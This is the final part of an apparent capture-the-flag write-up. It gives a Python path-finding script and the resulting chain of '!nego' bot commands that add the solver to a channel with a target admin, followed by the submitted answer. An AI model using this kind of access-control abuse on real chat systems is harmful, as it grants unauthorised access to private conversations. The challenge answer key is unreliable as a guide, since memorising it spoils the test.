    'dzkurn8put8udqwrij98u4s94w', 'g4tp7dewfjgziph3exxjzbrhwy', 'h64obyji93n75dcwwy4xfarcno', 'hypxe7jik7bjx881onw9of1nbe', 
    'iyyjrrh6i7d37dkk5tg6wsupnw'],

    "channel50056" : ['6k4nf8umejr7zfqfityfhtn9tw', '1xk1z5t3b3ggzeg4xrq3dyiyky', '1w36wtpq4tfhiqe7xdm6igx84o', 
    '5tohie4px3nmipga8maq7koqny', 'cw41xr7ydfnsjdfwqr9a7agtxr', 'dzkurn8put8udqwrij98u4s94w', 'g4tp7dewfjgziph3exxjzbrhwy', 
    'h64obyji93n75dcwwy4xfarcno', 'hbo689966irppefi37oafo3tca', 'hypxe7jik7bjx881onw9of1nbe', 'tosbendf6idnpc7egyw5wfau9h', 
    'w5sps8fbc7n1jk8bt88fkxs3ee', 
    'w5zjeekxpjfa3kzpzpw4mmzp1y', 'o91awst7w3fidn58ry4cp3r4xh', 'iyyjrrh6i7d37dkk5tg6wsupnw'],

    "channel50462" : ['bh87wmq4qfdmdbafhohpy6mq6h', 'o91awst7w3fidn58ry4cp3r4xh', '1xk1z5t3b3ggzeg4xrq3dyiyky',
    'w5zjeekxpjfa3kzpzpw4mmzp1y', '5tohie4px3nmipga8maq7koqny', '6k4nf8umejr7zfqfityfhtn9tw', 'cw41xr7ydfnsjdfwqr9a7agtxr', 
    'g4tp7dewfjgziph3exxjzbrhwy', 'h64obyji93n75dcwwy4xfarcno', 'hbo689966irppefi37oafo3tca', 'hypxe7jik7bjx881onw9of1nbe', 
    'tdzdyadzhfdt3nqto9dan3xtia', 'tosbendf6idnpc7egyw5wfau9h', 
    'w5sps8fbc7n1jk8bt88fkxs3ee', 'iyyjrrh6i7d37dkk5tg6wsupnw'],

    "channel52097" : ['o91awst7w3fidn58ry4cp3r4xh', '1w36wtpq4tfhiqe7xdm6igx84o', '1xk1z5t3b3ggzeg4xrq3dyiyky', '5tohie4px3nmipga8maq7koqny', 
    '6k4nf8umejr7zfqfityfhtn9tw', 'cw41xr7ydfnsjdfwqr9a7agtxr', 'bh87wmq4qfdmdbafhohpy6mq6h', 'g4tp7dewfjgziph3exxjzbrhwy', 
    'h64obyji93n75dcwwy4xfarcno', 'hbo689966irppefi37oafo3tca', 'tdzdyadzhfdt3nqto9dan3xtia', 'dzkurn8put8udqwrij98u4s94w', 
    'tosbendf6idnpc7egyw5wfau9h', 'w5sps8fbc7n1jk8bt88fkxs3ee', 'iyyjrrh6i7d37dkk5tg6wsupnw'],

    "channel52696" : ['g4tp7dewfjgziph3exxjzbrhwy', '1w36wtpq4tfhiqe7xdm6igx84o', '5tohie4px3nmipga8maq7koqny', 
    '6k4nf8umejr7zfqfityfhtn9tw', 'cw41xr7ydfnsjdfwqr9a7agtxr', 'dzkurn8put8udqwrij98u4s94w', 'h64obyji93n75dcwwy4xfarcno', 
    'tdzdyadzhfdt3nqto9dan3xtia', 'w5sps8fbc7n1jk8bt88fkxs3ee', '1xk1z5t3b3ggzeg4xrq3dyiyky', 'iyyjrrh6i7d37dkk5tg6wsupnw'],

    "channel52797" : ['iyyjrrh6i7d37dkk5tg6wsupnw', 'w5zjeekxpjfa3kzpzpw4mmzp1y', '1w36wtpq4tfhiqe7xdm6igx84o', '5tohie4px3nmipga8maq7koqny', 
    '6k4nf8umejr7zfqfityfhtn9tw', 'cw41xr7ydfnsjdfwqr9a7agtxr', 'dzkurn8put8udqwrij98u4s94w', 'g4tp7dewfjgziph3exxjzbrhwy', 
    'h64obyji93n75dcwwy4xfarcno', 'hypxe7jik7bjx881onw9of1nbe', 'tdzdyadzhfdt3nqto9dan3xtia', 
    'tosbendf6idnpc7egyw5wfau9h', 'w5sps8fbc7n1jk8bt88fkxs3ee', 'bh87wmq4qfdmdbafhohpy6mq6h', 'o91awst7w3fidn58ry4cp3r4xh'],

    "channel60625" : ['cw41xr7ydfnsjdfwqr9a7agtxr', '1w36wtpq4tfhiqe7xdm6igx84o', '5tohie4px3nmipga8maq7koqny', 
    '6k4nf8umejr7zfqfityfhtn9tw', 'hbo689966irppefi37oafo3tca', 'hypxe7jik7bjx881onw9of1nbe', 'w5sps8fbc7n1jk8bt88fkxs3ee', 
    'w5zjeekxpjfa3kzpzpw4mmzp1y', 'bh87wmq4qfdmdbafhohpy6mq6h', 'dzkurn8put8udqwrij98u4s94w', 'g4tp7dewfjgziph3exxjzbrhwy', 
    'h64obyji93n75dcwwy4xfarcno', 'tdzdyadzhfdt3nqto9dan3xtia', '1xk1z5t3b3ggzeg4xrq3dyiyky', 'iyyjrrh6i7d37dkk5tg6wsupnw'],

    "channel64675" : ['5tohie4px3nmipga8maq7koqny', '6k4nf8umejr7zfqfityfhtn9tw', '1w36wtpq4tfhiqe7xdm6igx84o', 'cw41xr7ydfnsjdfwqr9a7agtxr', 
    'dzkurn8put8udqwrij98u4s94w', 'g4tp7dewfjgziph3exxjzbrhwy', 'h64obyji93n75dcwwy4xfarcno', 'tosbendf6idnpc7egyw5wfau9h',
    'w5sps8fbc7n1jk8bt88fkxs3ee', 'hbo689966irppefi37oafo3tca', 'o91awst7w3fidn58ry4cp3r4xh', 'iyyjrrh6i7d37dkk5tg6wsupnw'],

    "channel64922" : ['1w36wtpq4tfhiqe7xdm6igx84o', '5tohie4px3nmipga8maq7koqny', '6k4nf8umejr7zfqfityfhtn9tw', 
    'cw41xr7ydfnsjdfwqr9a7agtxr', 'dzkurn8put8udqwrij98u4s94w', 'g4tp7dewfjgziph3exxjzbrhwy', 'h64obyji93n75dcwwy4xfarcno', 
    'hypxe7jik7bjx881onw9of1nbe', 'tdzdyadzhfdt3nqto9dan3xtia', 'tosbendf6idnpc7egyw5wfau9h', 'w5sps8fbc7n1jk8bt88fkxs3ee', 
    'w5zjeekxpjfa3kzpzpw4mmzp1y', 'hbo689966irppefi37oafo3tca', 'o91awst7w3fidn58ry4cp3r4xh', 'iyyjrrh6i7d37dkk5tg6wsupnw'],

    "channel69244" : ['dzkurn8put8udqwrij98u4s94w', 'iyyjrrh6i7d37dkk5tg6wsupnw', 'hbo689966irppefi37oafo3tca', '1w36wtpq4tfhiqe7xdm6igx84o', 
    '5tohie4px3nmipga8maq7koqny', '6k4nf8umejr7zfqfityfhtn9tw', 'cw41xr7ydfnsjdfwqr9a7agtxr', 'g4tp7dewfjgziph3exxjzbrhwy', 
    'h64obyji93n75dcwwy4xfarcno', 'hypxe7jik7bjx881onw9of1nbe', 'tdzdyadzhfdt3nqto9dan3xtia', 
    'tosbendf6idnpc7egyw5wfau9h', 'w5sps8fbc7n1jk8bt88fkxs3ee', 'w5zjeekxpjfa3kzpzpw4mmzp1y', '1xk1z5t3b3ggzeg4xrq3dyiyky'],

    "channel70588" : ['cw41xr7ydfnsjdfwqr9a7agtxr', '1w36wtpq4tfhiqe7xdm6igx84o', '6k4nf8umejr7zfqfityfhtn9tw', 
    'dzkurn8put8udqwrij98u4s94w', 'g4tp7dewfjgziph3exxjzbrhwy', 'h64obyji93n75dcwwy4xfarcno', 'hbo689966irppefi37oafo3tca', 
    'hypxe7jik7bjx881onw9of1nbe', 'tdzdyadzhfdt3nqto9dan3xtia', 'tosbendf6idnpc7egyw5wfau9h', 'w5sps8fbc7n1jk8bt88fkxs3ee', 
    'w5zjeekxpjfa3kzpzpw4mmzp1y', 'bh87wmq4qfdmdbafhohpy6mq6h', 'o91awst7w3fidn58ry4cp3r4xh', 'iyyjrrh6i7d37dkk5tg6wsupnw'],

    "channel74850" : ['cw41xr7ydfnsjdfwqr9a7agtxr', 'dzkurn8put8udqwrij98u4s94w', 'hbo689966irppefi37oafo3tca', 
    'hypxe7jik7bjx881onw9of1nbe', 'tdzdyadzhfdt3nqto9dan3xtia', 'w5sps8fbc7n1jk8bt88fkxs3ee', 'bh87wmq4qfdmdbafhohpy6mq6h', 
    'o91awst7w3fidn58ry4cp3r4xh', 'h64obyji93n75dcwwy4xfarcno', '1w36wtpq4tfhiqe7xdm6igx84o', '1xk1z5t3b3ggzeg4xrq3dyiyky', 
    '5tohie4px3nmipga8maq7koqny', '6k4nf8umejr7zfqfityfhtn9tw', 'w5zjeekxpjfa3kzpzpw4mmzp1y', 'iyyjrrh6i7d37dkk5tg6wsupnw'],

    "channel81167" : ['1xk1z5t3b3ggzeg4xrq3dyiyky', '5tohie4px3nmipga8maq7koqny', '6k4nf8umejr7zfqfityfhtn9tw', 'cw41xr7ydfnsjdfwqr9a7agtxr', 
    'dzkurn8put8udqwrij98u4s94w', 'g4tp7dewfjgziph3exxjzbrhwy', 'h64obyji93n75dcwwy4xfarcno', 'hbo689966irppefi37oafo3tca', 
    'hypxe7jik7bjx881onw9of1nbe', 'tosbendf6idnpc7egyw5wfau9h', 'w5sps8fbc7n1jk8bt88fkxs3ee', 
    'w5zjeekxpjfa3kzpzpw4mmzp1y', 'bh87wmq4qfdmdbafhohpy6mq6h', 'o91awst7w3fidn58ry4cp3r4xh', 'iyyjrrh6i7d37dkk5tg6wsupnw'],

    "channel92614" : ['bh87wmq4qfdmdbafhohpy6mq6h', 'o91awst7w3fidn58ry4cp3r4xh', '1w36wtpq4tfhiqe7xdm6igx84o', 
    '1xk1z5t3b3ggzeg4xrq3dyiyky', '5tohie4px3nmipga8maq7koqny', 'cw41xr7ydfnsjdfwqr9a7agtxr', 'dzkurn8put8udqwrij98u4s94w', 
    'g4tp7dewfjgziph3exxjzbrhwy', 'h64obyji93n75dcwwy4xfarcno', 'hbo689966irppefi37oafo3tca', 'hypxe7jik7bjx881onw9of1nbe', 
    'tdzdyadzhfdt3nqto9dan3xtia', 'tosbendf6idnpc7egyw5wfau9h', 'w5sps8fbc7n1jk8bt88fkxs3ee', 'iyyjrrh6i7d37dkk5tg6wsupnw']

}

def pick_nego_users(current_channel, target_channel):
    current_set = set(channels[current_channel])
    target_set = set(channels[target_channel])
    
    # Mods in current channel but NOT in target channel
    mod_candidates = [u for u in current_set if users[u].startswith("mod_") and u not in target_set and u != "rwagbspan7rxppfgrxjbcz4ore"]
    if not mod_candidates:
        raise ValueError("No mod in current channel outside target channel")
    
    mod = mod_candidates[0]  # pick the first mod
    
    # Non-mod users in current channel but NOT in target channel
    other_candidates = [u for u in current_set if not users[u].startswith("mod_") and u not in target_set]

    if len(other_candidates) < 2:
        raise ValueError("Not enough non-mod users in current channel outside target channel")
    
    others = other_candidates[:2]

    
    return [(users[mod], mod), (users[others[0]], others[0]), (users[others[1]], others[1])]

def find_path_to_target(start_channel, target):
    visited = set()  # Keep track of visited channels
    queue = [(start_channel, [])]  # channel, path of (users added, channel) tuples

    while queue:
        current_channel, path = queue.pop(0)
        if current_channel in visited:
            continue
        visited.add(current_channel)

        # If the target user is already in this channel, we found the path
        if target in channels[current_channel]:
            print(f"Reached target in channel: {current_channel}")
            return path + [([], current_channel)]

        # Explore all other channels as next steps
        for next_channel in channels:
            if next_channel not in visited:
                try:
                    # Pick users to negotiate from current_channel to next_channel
                    nego_users = pick_nego_users(current_channel, next_channel)
                except ValueError:
                    # No valid users to pick for this pair of channels
                    continue

                # Add these users to the next_channel (simulate negotiation)
                added_user_ids = [u[1] for u in nego_users]
                channels[next_channel].extend(added_user_ids)

                # Save path step
                path_step = (added_user_ids, next_channel)
                new_path = path + [path_step]

                queue.append((next_channel, new_path))

    print("No path found to target user.")
    return None

def print_nego_path(path):
    for added_users, channel in path:
        if not added_users:
            print(f"# Reached channel {channel} with target user!")
            continue

        # Separate mod from non-mods
        mod = [u for u in added_users if users[u].startswith("mod_")][0]
        non_mods = [u for u in added_users if u != mod]

        # Map IDs to usernames
        mod_name = users[mod]
        non_mod_names = [users[nm] for nm in non_mods]

        # Format the !nego command
        nego_command = f"!nego {channel} {non_mod_names[0]} {non_mod_names[1]} {mod_name}"
        print(nego_command)


def main():
    TARGET_USER = "rnqpjyd5mtnszfgpzkjguu18zo"

    print("Starting from the Public channel to reach the target user...\n")
    # Run the path finder from "public"
    path = find_path_to_target("public", TARGET_USER)

    # Pretty-print the path and users added
    if path:
        print_nego_path(path)


if __name__ == "__main__":

    main()
```

Running this gets us:

```
Starting from the Public channel to reach the target user...

Reached target in channel: channel33768
!nego channel52696 grumpyrhino73 euphoricraisins54 mod_needyboa0
!nego channel64675 grumpyrhino73 needypup16 mod_excitedburritos53
!nego channel48553 wingedmandrill37 needypup16 mod_amazedcamel5
!nego channel33768 wingedmandrill37 ardentpup59 mod_gloomyhyena90
# Reached channel channel33768 with target user!
```

Well, time to see if this works

Starting with the first command, running it in `Public`

![image5](./images/task6img5.png)

So far so good. Ignore the first error message, it did indeed add us to this channel. Also ignore the "Created channel..." message, it didn't actually create a new channel, it added us to the already existing `channel52696`. That's just the default message it provides, but nontheless shows us that the command succeeded. 

Now from within `channel52696`, we run the second command

![image6](./images/task6img6.png)

Beautiful. Now from within `channel64675`, we run the third command

![image7](./images/task6img7.png)

Nice. Now, for the moment of truth, from `channel48553` we run the last command

![image8](./images/task6img8.png)

With that, we indeed are in a channel with `admin_insecureapricots73` and can see some of his communications with some of the other bad actors

![image9](./images/task6img9.png)

Submitting 

```
!nego channel52696 grumpyrhino73 euphoricraisins54 mod_needyboa0
!nego channel64675 grumpyrhino73 needypup16 mod_excitedburritos53
!nego channel48553 wingedmandrill37 needypup16 mod_amazedcamel5
!nego channel33768 wingedmandrill37 ardentpup59 mod_gloomyhyena90
```

solves this task!

**Response:**
> Awesome job! We can now access the channel and are one step closer to removing this threat.